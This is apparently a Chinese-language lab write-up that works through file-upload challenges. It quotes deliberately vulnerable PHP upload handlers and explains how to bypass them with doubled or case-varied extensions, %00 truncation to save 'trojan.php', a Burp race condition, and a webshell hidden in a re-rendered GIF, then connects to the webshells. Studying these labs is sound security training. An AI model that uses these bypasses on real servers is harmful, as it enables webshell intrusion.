+<p>JPEG (jpg)，文件头：FFD8FF， <code>ÿØÿ</code> <!-- raw HTML omitted -->
+PNG (png)，文件头：89504E47， <code>.PNG</code> <!-- raw HTML omitted -->
+GIF (gif)，文件头：47494638， <code>GIF8</code> <!-- raw HTML omitted -->
+HTML (html)，文件头：68746D6C3E, <code>html&gt;</code> <!-- raw HTML omitted -->
+ZIP Archive (zip)，文件头：504B0304, <code>PK..</code> <!-- raw HTML omitted -->
+RAR Archive (rar)，文件头：52617221, <code>Rar!</code> <!-- raw HTML omitted -->
+Adobe Acrobat (pdf)，文件头：255044462D312E, <code>%PDF-1.</code> <!-- raw HTML omitted -->
+MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw HTML omitted --></p>
+<h3 id="有缺陷的代码1">有缺陷的代码1</h3>
+<p>根据题目提示结合源码，我们得知这里用了一个黑名单来过滤所有的webshell以及htaccess后缀的文件，猜测绕过可能发生在方法 <code>str_ireplace</code> 身上 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;php5&#34;</span><span class="p">,</span> <span class="s2">&#34;php4&#34;</span><span class="p">,</span> <span class="s2">&#34;php3&#34;</span><span class="p">,</span> <span class="s2">&#34;phtml&#34;</span><span class="p">,</span> <span class="s2">&#34;pht&#34;</span><span class="p">,</span> <span class="s2">&#34;jsp&#34;</span><span class="p">,</span> <span class="s2">&#34;jspa&#34;</span><span class="p">,</span> <span class="s2">&#34;jspx&#34;</span><span class="p">,</span> <span class="s2">&#34;jsw&#34;</span><span class="p">,</span> <span class="s2">&#34;jsv&#34;</span><span class="p">,</span> <span class="s2">&#34;jspf&#34;</span><span class="p">,</span> <span class="s2">&#34;jtml&#34;</span><span class="p">,</span> <span class="s2">&#34;asp&#34;</span><span class="p">,</span> <span class="s2">&#34;aspx&#34;</span><span class="p">,</span> <span class="s2">&#34;asa&#34;</span><span class="p">,</span> <span class="s2">&#34;asax&#34;</span><span class="p">,</span> <span class="s2">&#34;ascx&#34;</span><span class="p">,</span> <span class="s2">&#34;ashx&#34;</span><span class="p">,</span> <span class="s2">&#34;asmx&#34;</span><span class="p">,</span> <span class="s2">&#34;cer&#34;</span><span class="p">,</span> <span class="s2">&#34;swf&#34;</span><span class="p">,</span> <span class="s2">&#34;htaccess&#34;</span><span class="p">,</span> <span class="s2">&#34;ini&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="nv">$blacklist</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>根据以前绕过类似黑名单的经历，这里的 <code>str_ireplace</code> 简单的将所有的匹配替换为空，非常的危险，我们可以通过复写拼接的手段来进行绕过过滤 <!-- raw HTML omitted --></p>
+<p>例如 <code>pphphp</code> 第一个碰到的php被替换之后，就可以形成一个完整的php后缀了 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-04-29_12-18-24_screenshot.png" width="400px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>蚁剑连接测试成功 <!-- raw HTML omitted --></p>
+<h3 id="有缺陷的代码2">有缺陷的代码2</h3>
+<p>因为提示与上一题基本类似，不过提到了手动改成了Windows的特性，因此我们直接一起来看一下源码吧 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;php5&#34;</span><span class="p">,</span> <span class="s2">&#34;php4&#34;</span><span class="p">,</span> <span class="s2">&#34;php3&#34;</span><span class="p">,</span> <span class="s2">&#34;phtml&#34;</span><span class="p">,</span> <span class="s2">&#34;pht&#34;</span><span class="p">,</span> <span class="s2">&#34;jsp&#34;</span><span class="p">,</span> <span class="s2">&#34;jspa&#34;</span><span class="p">,</span> <span class="s2">&#34;jspx&#34;</span><span class="p">,</span> <span class="s2">&#34;jsw&#34;</span><span class="p">,</span> <span class="s2">&#34;jsv&#34;</span><span class="p">,</span> <span class="s2">&#34;jspf&#34;</span><span class="p">,</span> <span class="s2">&#34;jtml&#34;</span><span class="p">,</span> <span class="s2">&#34;asp&#34;</span><span class="p">,</span> <span class="s2">&#34;aspx&#34;</span><span class="p">,</span> <span class="s2">&#34;asa&#34;</span><span class="p">,</span> <span class="s2">&#34;asax&#34;</span><span class="p">,</span> <span class="s2">&#34;ascx&#34;</span><span class="p">,</span> <span class="s2">&#34;ashx&#34;</span><span class="p">,</span> <span class="s2">&#34;asmx&#34;</span><span class="p">,</span> <span class="s2">&#34;cer&#34;</span><span class="p">,</span> <span class="s2">&#34;swf&#34;</span><span class="p">,</span> <span class="s2">&#34;htaccess&#34;</span><span class="p">,</span> <span class="s2">&#34;ini&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nv">$blacklist</span><span class="p">,</span> <span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>发现这次的 <code>str_replace()</code> 方法替换的是空格，因此没办法用上一遍的套路 <!-- raw HTML omitted --></p>
+<p>仔细一看，此replace非彼replace，这个 <code>str_replace</code> 是case sensitive而前一个的 <code>str_ireplace</code> 指的就是 case insensitive <!-- raw HTML omitted --></p>
+<p>那么我们用 <code>Php</code> 即可完成绕过 <!-- raw HTML omitted --></p>
+<p>但是就像提示所说的那样，这题实际用蚁剑是没有办法成功连接的，因为毕竟只是模拟windows环境，本质上还是linux，不存在这样的漏洞 <!-- raw HTML omitted --></p>
+<h3 id="古老的漏洞-1">古老的漏洞 - 1</h3>
+<p>根据本题的提示，这是一个00漏洞，说其古老主要是因为只有在PHP版本小于5.3.4版本才有效，并且要求magic_quotes_gpc = Off的情况（我们在<a class="link" href="https://ginkgo.org.cn/posts/sqli_labs_study/#lesson-17"  target="_blank" rel="noopener"
+    >sqli-labs的学习中</a>看到过这个） <!-- raw HTML omitted --></p>
+<p>结合源码来看，这里用了一个严格的白名单过滤，并且利用随机临时文件名，让我们无法使用 <code>htaccess</code> 来修改指定文件的配置 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$info</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$whitelist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;jpg&#34;</span><span class="p">,</span> <span class="s2">&#34;jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;png&#34;</span><span class="p">,</span> <span class="s2">&#34;gif&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">99</span><span class="p">)</span> <span class="o">.</span> <span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;.&#34;</span> <span class="o">.</span> <span class="nv">$ext</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$des</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;road&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;/&#34;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$des</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;文件类型不匹配&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>因此我们我们通过修改POST的文件路径在后面加上 <code>trojan.php%00</code>,然后将上传的文件改成gif格式，这样在上面进行后缀判断的时候，用的就是 <code>gif</code>,而进行存储的时候提取的后缀名就会因为 <code>%00</code> 的关系忽略最后的 <code>gif</code> 以及临时文件名的名字而只保存 <code>trojan.php</code>  <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-04-29_15-47-47_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-04-29_15-47-36_screenshot.png" width="200px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>最后通过蚁剑连接成功 <!-- raw HTML omitted --></p>
+<h3 id="古老的漏洞-2">古老的漏洞 - 2</h3>
+<p>这题同样是利用00截断，只不过是发生在了 <code>POST</code> 请求上面 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-04-29_16-00-55_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>这里别忘了用URL解码一下，因为不像上一题是放在url里面会自动解析 <!-- raw HTML omitted --></p>
+<p>蚁剑连接成功 <!-- raw HTML omitted --></p>
+<h3 id="黑名单缺陷">黑名单缺陷</h3>
+<p>看源码，观察到用了一个黑名单来过滤webshell，但是一看就比之前遇到过的黑名单短了很多，我们这里利用webshell会有很多的解析的变种来完成绕过 <!-- raw HTML omitted --></p>
+<p>将文件的后缀改为 <code>php4</code> 即可完成绕过 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">)[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;asp&#34;</span><span class="p">,</span><span class="s2">&#34;aspx&#34;</span><span class="p">,</span><span class="s2">&#34;php&#34;</span><span class="p">,</span><span class="s2">&#34;jsp&#34;</span><span class="p">,</span><span class="s2">&#34;htaccess&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$blacklist</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="条件竞争">条件竞争</h3>
+<p>其实根据提醒我们已经可以有一个明确的思路了，就是我们利用系统一次只能处理一件事情的特性，通过同时发起上传以及访问的请求，导致服务器还来不及处理删除却先执行访问，导致webshell的写入 <!-- raw HTML omitted --></p>
+<p>我们在结合源码来看，这里采用了白名单的手段避免了任何的绕过，所以我们来利用条件竞争来尝试绕过 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">)[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$upload_file</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$whitelist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span><span class="s1">&#39;png&#39;</span><span class="p">,</span><span class="s1">&#39;gif&#39;</span><span class="p">,</span><span class="s1">&#39;jpeg&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span><span class="nv">$whitelist</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$rename_file</span> <span class="o">=</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">99</span><span class="p">)</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="o">.</span> <span class="nv">$rename_file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">rename</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>我们通过Burp的Intruder进行无限制的请求，一边上传文件，这将触发服务器进行审核以及删除，一边访问 <code>shell.php</code> 来调用，最终服务器会因为来不及删除而导致webshell被成功调用， <code>trojan.php</code> 被写入。 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-04-30_16-12-33_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-04-30_16-12-20_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted --> <!-- raw HTML omitted -->
+最终我们可以看到 <code>trojan.php</code> 被成功写入，同时用蚁剑测试连接成功 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-04-30_16-13-56_screenshot.png" width="300px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<h3 id="二次渲染">二次渲染</h3>
+<p>根据提示信息，我们知道我们所上传的图片马会被二次渲染，导致失效，因此我们分不同的图片格式来绕过 <!-- raw HTML omitted -->
+同时我们点击查看提示的按钮，可以发现url发生了变化，结合源码，我们发现这里可以用来解析我们上传成功绕过渲染的图片马，形成文件上传漏洞 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;button&#34;</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;btn btn-success&#34;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&#34;window.location.href=(&#39;?file=hint.html&#39;)&#34;</span><span class="o">&gt;</span><span class="nx">点击查看</span> <span class="nx">“提示”</span><span class="o">&lt;/</span><span class="nx">button</span><span class="o">&gt;&lt;/</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">p</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;lead&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作，所以普通的图片马都难逃被渲染的悲剧，那么有没有那种可以绕过渲染的图片呢？</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-success&#34;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;window.location.href=(&#39;?file=hint.html&#39;)&#34;</span><span class="p">&gt;</span>点击查看 “提示”<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+</span></span></code></pre></div><h4 id="gif">GIF</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;gif&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/gif&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmpname</span><span class="p">,</span> <span class="nv">$upload_file</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">         <span class="c1">//使用上传的图片生成新的图片
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$im</span> <span class="o">=</span> <span class="nx">imagecreatefromgif</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$im</span> <span class="o">==</span> <span class="k">false</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//给新图片指定文件名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">srand</span><span class="p">(</span><span class="nx">time</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$newfilename</span> <span class="o">=</span> <span class="nx">strval</span><span class="p">(</span><span class="nx">rand</span><span class="p">())</span><span class="o">.</span><span class="s2">&#34;.gif&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1">//显示二次渲染后的图片（使用用户上传图片生成的新图片）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$newfilename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nx">imagegif</span><span class="p">(</span><span class="nv">$im</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>我们用 <code>Hex Friend</code> 对比一下原gif和上传后二次渲染的gif <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/gif.gif" width="100px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/gif_edited.gif" width="100px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted --> <!-- raw HTML omitted -->
+然后将一句话木马插入到没有被修改的位置即可 <!-- raw HTML omitted -->
+可以看到经过二次渲染的图片仍然含有一句话木马 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-04-30_17-06-36_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>再利用发现的漏洞，解析上传成功的图片马，蚁剑测试连接成功 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-04-30_17-17-20_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
